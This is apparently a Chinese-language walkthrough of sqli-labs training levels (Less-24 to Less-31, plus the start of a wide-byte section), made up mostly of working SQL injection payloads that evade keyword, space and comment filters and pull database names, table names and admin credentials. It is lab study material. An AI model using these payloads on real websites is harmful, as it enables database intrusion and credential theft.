<p>&#x7B2C;&#x4E8C;&#x6B65;&#xFF1A;&#x5F15;&#x7528;&#x6076;&#x610F;&#x6570;&#x636E;<br>&#x5F00;&#x53D1;&#x8005;&#x9ED8;&#x8BA4;&#x5B58;&#x5165;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x90FD;&#x662F;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53D6;&#x51FA;&#x6076;&#x610F;&#x6570;&#x636E;&#xFF0C;&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x8FDB;&#x4E00;&#x6B65;&#x7684;&#x68C0;&#x9A8C;&#x7684;&#x5904;&#x7406;&#x3002;<br>&#x672C;&#x5730;&#x767B;&#x5F55;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x5931;&#x8D25;&#xFF0C;&#x4E8E;&#x662F;&#x67E5;&#x770B;&#x6E90;&#x7801;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);<br>$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);<br>$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7531;&#x4E8E;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x7684;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x4F7F;&#x7528;<code>mysql_real_escape_string</code>&#x8F6C;&#x4E49;&#x8FC7;&#x3002;<br>&#x672C;&#x9898;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x4E8C;&#x6B21;&#x6CE8;&#x5165;</p>
<ol>
<li>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;user&#x53EB;&#x505A;<code>admin&apos;#</code>,&#x5BC6;&#x7801;&#x968F;&#x610F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x771F;&#x7684;&#x5C31;&#x51FA;&#x73B0;&#x4E86;&#x8FD9;&#x4E48;&#x4E00;&#x6761;&#x6570;&#x636E;</li>
<li>&#x7136;&#x540E;&#x4F7F;&#x7528;<code>admin&apos;#</code>&#x52A0;&#x4E0A;&#x81EA;&#x5DF1;&#x7684;&#x5BC6;&#x7801;&#x767B;&#x5F55;</li>
<li>&#x7136;&#x540E;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x6700;&#x540E;&#x6548;&#x679C;&#x5C45;&#x7136;&#x662F;&#x5C06;admin&#x7528;&#x6237;&#x6539;&#x4E3A;123456&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x81EA;&#x5DF1;&#x65B0;&#x5EFA;&#x7684;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x8FD8;&#x662F;&#x81EA;&#x5DF1;&#x8BBE;&#x5B9A;&#x7684;</li>
</ol>
<p>why?<br>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x770B;&#x66F4;&#x65B0;&#x5BC6;&#x7801;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x4E3A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x9762;&#x7684;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x65B0;&#x8BED;&#x53E5;&#xFF0C;&#x5728;&#x7528;&#x6237;&#x540D;&#x4E3A; &#x201C;admin&#x2019;#&#x201D; &#x65F6;&#x6267;&#x884C;&#x7684;&#x5B9E;&#x9645;&#x662F;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos; &quot;;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7B49;&#x540C;&#x4E8E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;;<br></code></pre></td></tr></tbody></table></figure>

<h4><span id="less-25">Less-25</span></h4><p>&#x628A; or&#x3001;and&#x8FC7;&#x6EE4;&#x4E86;,&#x5176;&#x5B9E;&#x597D;&#x50CF;&#x4E5F;&#x6CA1;&#x600E;&#x4E48;&#x7528;&#x4E0A;&#xFF0C;&#x800C;&#x4E14;&#x53D1;&#x73B0;&#x53EA;&#x662F;&#x4E00;&#x6B21;&#x8FC7;&#x6EE4;&#xFF0C;&#x901A;&#x8FC7;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x90A3;&#x4E48;&#x548C;&#x7B2C;&#x4E00;&#x9898;&#x5C31;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;<br>&#x6BD4;&#x5982;order&#x4E2D;&#x6709;or&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5199;&#x6210;oorrder,&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;or&#x8FC7;&#x6EE4;&#x540E;&#x5269;&#x4E0B;&#x4E3A;order</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-25a">Less-25a</span></h4><p>&#x5148;&#x5BFB;&#x627E;&#x6CE8;&#x5165;&#x70B9;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&quot; oorr 1 %23<br>1&apos; oorr 1 %23<br>1 oorr 1 %23<br></code></pre></td></tr></tbody></table></figure>
<p>&#x53EA;&#x6709;&#x7B2C;&#x4E09;&#x79CD;&#x6CA1;&#x5565;&#x95EE;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x9898;&#x5C31;&#x662F;&#x4E0D;&#x9700;&#x8981;&#x52A0;&#x5F15;&#x53F7;&#x76F4;&#x63A5;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-26">Less-26</span></h4><p>&#x7A7A;&#x683C;&#x4E0E;&#x6CE8;&#x91CA;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;,&#x6700;&#x540E;&#x7684;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>or &apos;1&apos;=&apos;1</code> &#x6765;&#x95ED;&#x5408;&#xFF0C;<br>&#x7136;&#x540E;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7528;&#x8FD9;&#x4E9B;&#x4EE3;&#x66FF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">%09 = TAB&#x952E;&#xFF08;&#x6C34;&#x5E73;&#xFF09;<br><br>%0a = &#x65B0;&#x5EFA;&#x4E00;&#x884C;<br><br>%0c = &#x65B0;&#x7684;&#x4E00;&#x9875;<br><br>%0d = return&#x529F;&#x80FD;<br><br>%0b = TAB&#x952E;&#xFF08;&#x5782;&#x76F4;&#xFF09;<br><br>%a0 = &#x7A7A;&#x683C;<br><br>&amp;&amp;(%26%26) = and<br></code></pre></td></tr></tbody></table></figure>
<p>&#x4F7F;&#x7528;&#x62A5;&#x9519;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8FD9;&#x6837;&#x662F;&#x6CA1;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x7136;&#x540E;&#x7206;&#x5E93;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0%27||updatexml(1,concat(0x7e,(select%0Agroup_concat(schema_name)%0Afrom%0Ainfoorrmation_schema.schemata),0x7e),1)||%271%27=%271<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7136;&#x540E;&#x4E0D;&#x884C;&#x4E86;&#xFF0C;&#x9ED1;&#x4EBA;&#x95EE;&#x53F7;&#xFF1F;<br>&#x8BD5;&#x8BD5;&#x76F4;&#x63A5;&#x62FF;&#x6570;&#x636E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0%27||updatexml(1,concat(0x7e,(select%0agroup_concat(username)%0afrom%0ausers),0x7e),1)||%271%27=%271<br></code></pre></td></tr></tbody></table></figure>
<p><img src="63.png"><br><img src="62.png"><br>&#x6700;&#x540E;&#x7F51;&#x4E0A;&#x6709;&#x5E08;&#x5085;&#x56DE;&#x7B54;&#x662F;windows&#x7CFB;&#x7EDF;&#x7684;&#x7F18;&#x6545;&#xFF1F;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x7528;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;&#x4E56;&#x4E56;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||extractvalue(1, concat(0x5c,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database())))||&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8868;&#x540D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||updatexml(1,concat(&apos;$&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&apos;security&apos;))),0)||&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5B57;&#x6BB5;&#x540D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||updatexml(1,concat(&apos;$&apos;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&apos;security&apos;)%26%26(table_name=&apos;users&apos;))),0)||&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6570;&#x636E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||updatexml(1,concat(&apos;$&apos;,(select(concat(&apos;$&apos;,id,&apos;$&apos;,username,&apos;$&apos;,passwoorrd))from(users)where(username)=&apos;admin&apos;)),0)||&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>

<h4><span id="less-26-a">Less-26-a</span></h4><p>&#x9898;&#x76EE;&#x63D0;&#x793A;&#x7A7A;&#x683C;&#x4E0E;&#x6CE8;&#x91CA;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#x800C;&#x4E14;&#x52A0;&#x4E86;&#x62EC;&#x53F7;&#xFF0C;&#x6240;&#x4EE5;&#x8FD8;&#x662F;&#x76F2;&#x6CE8;&#x89E3;&#x51B3;&#x5427;(&#x5176;&#x5B9E;&#x8FD8;&#x662F;windows&#x73AF;&#x5883;&#x7684;&#x9505;&#x5BFC;&#x81F4;%0a&#x7B49;&#x4E0D;&#x80FD;&#x5B9E;&#x73B0;&#xFF0C;&#x6B63;&#x7ECF;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x662F;windows&#x7684;&#x5427;)<br>&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x662F;&#x53EF;&#x4EE5;de</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">100&apos;)union%a0select%a01,user(),(&apos;3<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-27">Less-27</span></h4><p>&#x9898;&#x76EE;&#x63D0;&#x793A;union&#x4E0E;select&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x62A5;&#x9519;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x5927;&#x5C0F;&#x5199;&#x6765;&#x7ED5;&#x8FC7;&#x8FD8;&#x662F;&#x4E0A;&#x9762;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;windows&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;%0a&#x4E0D;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x62A5;&#x9519;&#x6765;&#x5199;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||(updatexml(1,concat(0x5e5e,database()),1))||&apos;1&apos;=&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7136;&#x540E;&#x60F3;&#x62FF;&#x6570;&#x636E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;||updatexml(1,concat(&apos;$&apos;,(select(concat(&apos;$&apos;,id,&apos;$&apos;,username,&apos;$&apos;,password))from(users)where(username)=&apos;admin&apos;)),0)||&apos;1&apos;=&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5F88;&#x597D;&#x5C31;&#x62A5;&#x9519;&#x4E86;<br><img src="62.png"><br>&#x7136;&#x540E;&#x53D1;&#x73B0;&#x6709;&#x5E08;&#x5085;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x975E;&#x5E38;&#x9A9A;&#x7684;&#x505A;&#x6CD5;,&#x7528;<code>/*%0a*/</code>&#x5F3A;&#x884C;&#x5236;&#x9020;&#x7A7A;&#x683C;&#x3002;awsl</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8868;&#x540D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(table_name)/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=&apos;security&apos;),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5B57;&#x6BB5;&#x540D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(column_name)/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_schema=&apos;security&apos;/*%0a*/%26%26/*%0a*/table_name=&apos;users&apos;),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6570;&#x636E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(concat_ws(&apos;$&apos;,id,username,password))/*%0a*/from/*%0a*/users),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-27-a">Less-27-a</span></h4><p>&#x628A;&#x5355;&#x5F15;&#x53F7;&#x6539;&#x6210;&#x53CC;&#x5F15;&#x53F7;&#x5373;&#x53EF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&quot;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&quot;1&quot;=&quot;1<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-28">Less-28</span></h4><p>1&#x548C;1&#x201D;&#x6B63;&#x5E38;&#x56DE;&#x663E;&#xFF0C;1&#x2019;&#x62A5;&#x9519;&#xFF0C;&#x5355;&#x5F15;&#x53F7;&#x5B57;&#x7B26;&#x578B;&#x3002;<br>2&#x2019;&amp;&amp;&#x2019;1&#x2019;=&#x2019;1&#x56DE;&#x663E;&#x4E3A;id=1&#xFF0C;&#x6709;&#x5C0F;&#x62EC;&#x53F7;&#x3002;&#x56E0;&#x4E3A;&#x5F53;&#x4F60;&#x6709;&#x5C0F;&#x62EC;&#x53F7;&#x7684;&#x65F6;&#x5019;<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</code>&#x53D8;&#x6210;<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;) LIMIT 0,1&quot;;</code><br>&#x6240;&#x4EE5;&#x4F1A;&#x53D8;&#x6210;id=1<br>&#x770B;&#x4E86;&#x4E0B;&#x4EE3;&#x7801;</p>
<!--more-->
<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = blacklist(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$hint</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>{<br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/[\/\*]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);               <span class="hljs-comment">//strip out /*</span><br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/[--]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);                 <span class="hljs-comment">//Strip out --.</span><br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/[#]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);                  <span class="hljs-comment">//Strip out #.</span><br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/[ +]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);                 <span class="hljs-comment">//Strip out spaces.</span><br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/[ +]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);                 <span class="hljs-comment">//Strip out spaces.</span><br>    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&apos;/union\s+select/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);      <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8FC7;&#x6EE4;&#x4E86;&#x76F8;&#x8FDE;&#x7684;union&#x548C;select&#xFF0C;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x590D;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x6216;&#x8005;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x4EE3;&#x66FF;&#x7A7A;&#x683C;,&#x5982;&#x4E0B;&#x90FD;&#x53EF;&#x80FD;&#x53EF;&#x4EE5;&#x4EE3;&#x66FF;&#x7A7A;&#x683C;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">%0a<br>%0d<br>%20<br>%0b<br>%a0<br>/%0a/<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8FD9;&#x9898;&#x53EF;&#x4EE5;&#x7528;%0a&#xFF0C;&#x4F7F;&#x7528;%00&#x622A;&#x65AD;<br>&#x53EF;&#x4EE5;&#x76F2;&#x6CE8;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&apos;)||left(database(),1)&gt;&apos;s&apos;;%00<br></code></pre></td></tr></tbody></table></figure>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;union select&#x76F4;&#x63A5;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">333&apos;)union%a0select(1),(database()),(3)||(&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p><img src="71.png"><br>&#x89E3;&#x91CA;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;<br>$sql=&quot;SELECT * FROM users WHERE id=(&apos;333&apos;)union%a0select(1),(database()),(3)||(&apos;1&apos;) LIMIT 0,1&quot;;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x524D;&#x9762;&#x7684;333&#x53EF;&#x4EE5;&#x5C3D;&#x91CF;&#x5927;&#x4E00;&#x4E9B;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;-1&#x3002;</p>
<h4><span id="less-28-a">Less-28-a</span></h4><p>&#x611F;&#x89C9;&#x5C31;&#x50CF;&#x770B;&#x9519;&#x4E86;&#x9898;&#xFF1F;28-a&#x5C45;&#x7136;&#x662F;&#x5728; Less 28 &#x7684;&#x57FA;&#x7840;&#x4E0A;&#x8FD8;&#x6CE8;&#x91CA;&#x6389;&#x4E86;&#x5F88;&#x591A;&#x8FC7;&#x6EE4;&#x3002;&#x8FD9;&#x6837;28&#x7684;payload&#x80AF;&#x5B9A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6253;<br>&#x7ED9;&#x51FA;&#x4E00;&#x4E2A;&#x5F3A;&#x4E00;&#x70B9;&#x7684;&#x8FC7;&#x6EE4;</p>
<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = blacklist(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$hint</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>{<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/or/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/and/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[\/\*]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[--]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[#]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[\/\\\\]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[ +]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/[\s]/&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/select/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/union/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-string">&apos;/union\s+select/i&apos;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>&#x672B;&#x5C3E;\i&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x7EDF;&#x7EDF;&#x8FC7;&#x6EE4;</p>
<h4><span id="less-29">Less-29</span></h4><p>&#x6BD4;&#x8F83;&#x667A;&#x969C;&#x4E86;&#x5427;&#xFF0C;&#x597D;&#x50CF;&#x8FC7;&#x6EE4;&#x4EC0;&#x4E48;&#xFF0C;&#x76F4;&#x63A5;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0%27union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-30">Less-30</span></h4><p>&#x540C;&#x4E0A;&#xFF0C;&#x53EA;&#x662F;&#x5355;&#x5F15;&#x53F7;&#x53D8;&#x53CC;&#x5F15;&#x53F7;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&quot;union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-31">Less-31</span></h4><p>&#x540C;&#x4E0A;&#xFF0C;&#x53EA;&#x662F;&#x53CC;&#x5F15;&#x53F7;&#x52A0;&#x4E86;&#x62EC;&#x53F7;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0&quot;)union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23<br></code></pre></td></tr></tbody></table></figure>

<h4><span id="&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;">&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</span></h4><p>&#x56FD;&#x5185;&#x6700;&#x5E38;&#x4F7F;&#x7528;&#x7684; GBK &#x7F16;&#x7801;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E3B;&#x8981;&#x662F;&#x7ED5;&#x8FC7; addslashes &#x7B49;&#x5BF9;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x8F6C;&#x79FB;&#x7684;&#x7ED5;&#x8FC7;&#x3002;mysql&#x5728;&#x4F7F;&#x7528;GBK&#x7F16;&#x7801;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E3A;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#xFF0C;&#x4F8B;&#x5982;%df%5c&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#x3002;&#x53CD;&#x659C;&#x6760; \ &#x7684;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x4E3A; %5c&#xFF0C;&#x5728;&#x4F60;&#x8F93;&#x5165; %bf%27 &#x65F6;&#xFF0C;&#x51FD;&#x6570;&#x9047;&#x5230;&#x5355;&#x5F15;&#x53F7;&#x81EA;&#x52A8;&#x8F6C;&#x79FB;&#x52A0;&#x5165; \&#xFF0C;&#x6B64;&#x65F6;&#x53D8;&#x4E3A; %bf%5c%27&#xFF0C;%bf%5c &#x5728; GBK &#x4E2D;&#x53D8;&#x4E3A;&#x4E00;&#x4E2A;&#x5BBD;&#x5B57;&#x7B26;&#x300C;&#x7E17;&#x300D;&#x3002;%bf &#x90A3;&#x4E2A;&#x4F4D;&#x7F6E;&#x53EF;&#x4EE5;&#x662F; %81-%fe &#x4E2D;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x5B57;&#x7B26;&#x3002;&#x4E0D;&#x6B62;&#x5728; SQL &#x6CE8;&#x5165;&#x4E2D;&#xFF0C;&#x5BBD;&#x5B57;&#x7B26;&#x6CE8;&#x5165;&#x5728;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x90FD;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x3002;<br>&#x5148;&#x4E86;&#x89E3;addslashes() &#x51FD;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x8F6C;&#x4E49;&#x51FD;&#x6570;</p>
